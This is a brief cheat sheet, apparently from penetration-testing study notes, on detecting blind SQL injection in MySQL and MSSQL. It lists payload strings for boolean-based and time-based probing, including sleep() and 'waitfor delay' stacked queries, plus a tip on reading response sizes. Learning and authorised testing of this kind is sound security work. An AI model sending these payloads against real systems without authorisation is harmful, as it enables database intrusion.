
#### MySQL

_blind_ SQL injections describe scenarios in which database responses are never returned and behavior is inferred using either boolean- or time-based logic.

`<truthy legit value>' and 1=1 -- //` - testing for boolean based blind sqli. if we already have a truthy value and we tac on our test, we can determine if we can utilized boolean based injection if we still get a correct legitimate result returned.

`<truthy legit value>' and if (1=1, sleep(3), 'false') -- //` - equivalent testing using time based injection.

`' or if (1=1, sleep(5), 'false');-- //` - or conditional to quickly check for sqli vuln.

`look at the size of the return, with blind sqli there may be no results returned to the page that are differnt, differing results may be invisible - LOOK AT THE SIZE OF THE CONTENT-LENGTH RETURNED and determine which is a successful size and error/broken/fail size`

#### MSSQL

`test'; waitfor delay '0:0:5'-- //` - time based blind test stacked query

